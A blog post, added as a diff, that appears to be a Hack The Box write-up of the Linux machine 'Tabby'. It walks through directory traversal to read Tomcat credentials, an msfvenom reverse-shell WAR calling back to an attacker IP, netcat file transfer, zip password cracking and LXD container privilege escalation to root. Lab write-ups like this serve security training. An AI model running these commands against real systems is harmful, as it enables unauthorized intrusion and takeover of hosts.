@@ -1,0 +1,207 @@
+---
+layout: post
+title:  "HTB Writeup [Linux - Easy] - Tabby"
+published: false
+---
+
+![](/assets/Tabby/Tabby.png)
+
+### Summary
+- **Tabby** is a **linux** machine hosting both **Apache web server** and **Tomcat**.
+- The website on port 80 had a **Directory Traversal vulnerability** which enabled us to **read a tomcat configuration file** that **contained valid credentials.**
+- *Using those,* we **get a user with enough privileges to upload a WAR file containing a reverse shell**. *And, with that*, we **access the box** as the `tomcat` user.
+- We find an **encrypted backup archive in the webroot**. We **crack it** with `john` to **get a password.**
+- The password was *being reused* by another user on the box (`ash`). And, he happened to be **a member of the `lxd` group.**
+- We **escalate our privileges** to `root` by **creating a specially-configured container**.
+
+---
+
+### NMAP
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
+|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
+|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Mega Hosting
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+`nmap` gives us areas to check: the **website on port 80** and the **Tomcat instance on port 8080**
+
+### Port 80
+The home page here was mostly **static content**.
+
+![](/assets/Tabby/homepage-port-80.jpg)
+
+*except for* the **link for the "News" page.**
+
+note: *on the link below*, notice *how the host name changed* to **"megahosting.htb"**
+
+![](/assets/Tabby/virtual-host-routing.jpg)
+
+an entry in our `/etc/hosts` should take care of this **Virtual Host Routing**
+
+```
+10.10.10.194 megahosting.htb
+```
+
+we also notice that `news.php` handles **a parameter** called `file`. this looks like a **file inclusion vulnerability.**
+
+![](/assets/Tabby/lfi-spotted.jpg)
+
+trying `/etc/passwd` in the parameter doesn't work.
+
+but going **4 directories back** with `../../../../` gets us the **confirmation** we need.
+
+![](/assets/Tabby/lfi-confirmed.jpg)
+
+*after a couple of tries to get the path right,* we are able to **retrieve the source code** of the `news.php` file:
+
+![](/assets/Tabby/news-php-src-code.jpg)
+
+the `fopen` function here makes this a **Directory/Path Traversal vulnerability** and **not a Local File Inclusion.**
+
+that's because `fopen` just **reads a file's contents**. it **doesn't evaluate PHP code** like `include` or `require`
+
+***Knowing this bit spares us the effort of trying to get code execution by including PHP.***
+
+### Reading sensitive files
+*As a quick check,* I try to read the `ash` user's **private SSH key** from `/home/ash/.ssh/id_rsa`. But it's *not that easy* :)
+
+I then think "maybe I should check out the tomcat to avoid any rabbit holes". In case there's something to be found there.
+
+![](/assets/Tabby/tomcat-homepage.jpg)
+
+We get some **decent information** from this page. the **webroot** and **where Tomcat is installed.**
+
+*But, when it comes to sensitive files,* there's **a very important one** called `tomcat-users.xml`. it's in `/usr/share/tomcat9/etc/` by default.
+
+*When checking,* it's there!
+
+and we get **creds for a user** with **very nice privileges** :]
+
+![](/assets/Tabby/reading-tomcat-users-xml.jpg)
+
+### Exploiting the manager-script tomcat role to get RCE
+The `manager-script` role has access to **upload WAR files.**
+
+which can be a **reverse shell** generated using `msfvenom`. we do that
+
+```bash
+msfvenom -p java/shell_reverse_tcp lhost=10.10.16.3 lport=9000 -f war -o revvy.war
+```
+
+![](/assets/Tabby/creating-a-war-file.jpg)
+
+and follow with **uploading the WAR file** using `curl`
+
+```bash
+curl -v -u tomcat:'$3cureP4s5w0rd123!' -T revvy.war "http://tabby:8080/manager/text/deploy?path=/shell&update=true"
+```
+
+start up a `netcat` listener on port 9000
+
+```bash
+nc -lvnp 9000
+```
+
+and `curl` the endpoint for our reverse shell
+
+```bash
+curl http://tabby:8080/shell
+```
+
+![](/assets/Tabby/shell-as-tomcat.jpg)
+
+we're in as `tomcat` :)
+
+### Pivoting through Password Reuse
+
+*Right after improving my shell,* I start with **checking the files** in `/var/www/html`
+
+there's a folder called `files`. It contained a **password-protected zip archive** that's ***owned by*** the `ash` user.
+
+![](/assets/Tabby/finding-ashes-zip-file.jpg)
+
+we **transfer it over** to our kali using `netcat` so we can **crack** it
+
+```bash
+# on the victim
+nc -lvnp 5000 < 16162020_backup.zip
+# on the attacker
+nc tabby 5000 > ash_backup.zip
+```
+
+*and, to verify that the file wasn't corrupted in-transit,* we do a quick **integrity check** using `md5sum`.
+
+![](/assets/Tabby/transferring-zip-file.jpg)
+
+we use `zip2john` to **get a hash** for `john` to crack
+
+![](/assets/Tabby/zip-password.jpg)
+
+it successfully cracked. but we *didn't find anything important* after unzipping the archive :/
+
+![](/assets/Tabby/zip-files.jpg)
+
+the files were *practically the same* as the original ones.
+
+*But, since we now had a password,* we tried it against `ash` and `root`
+
+didn't work with `root`, but **did** with `ash` :)
+
+![](/assets/Tabby/logged-in-as-ash.jpg)
+
+### LXD Privilege Escalation
+*As you may have noticed from the previous image,* `ash` is part of the `lxd` group
+
+![](/assets/Tabby/lxd-group-membership.jpg)
+
+this is *almost exactly the same situation* as in the [Brainfuck Privesc](https://omnisl4sh.github.io/2022/08/17/Brainfuck.html#lxd-privilege-escalation).
+
+one *minor difference* is that **we have to initialize the LX daemon** with `lxd init` before importing the image.
+
+note: also make sure to add `/snap/bin` to the `PATH` environment variable as *it's not there by default.*
+
+```bash
+export PATH=$PATH:/snap/bin/
+```
+
+![](/assets/Tabby/lxd-init.jpg)
+
+*for a bit of automation,* we're going to throw the commands in a **bash script**. here are the contents:
+
+```bash
+#!/bin/bash
+lxc image import alpine-small-image.tar.gz --alias myimage
+lxc image list
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+```
+
+*after getting the container root shell,* we add an **SUID bit** to the host's **bash shell** so we can run it as `root`
+
+```bash
+chmod +s /mnt/root/bin/bash
+```
+
+![](/assets/Tabby/lxc-root-bash-script.jpg)
+
+### Cleaning Up
+
+*To clear out any remnants,* we have to **stop the container**, **delete it** along with **the image we imported.**
+
+```bash
+lxc stop mycontainer
+lxc delete mycontainer
+lxc image delete myimage
+```
+
+![](/assets/Tabby/lxc-cleanup.jpg)
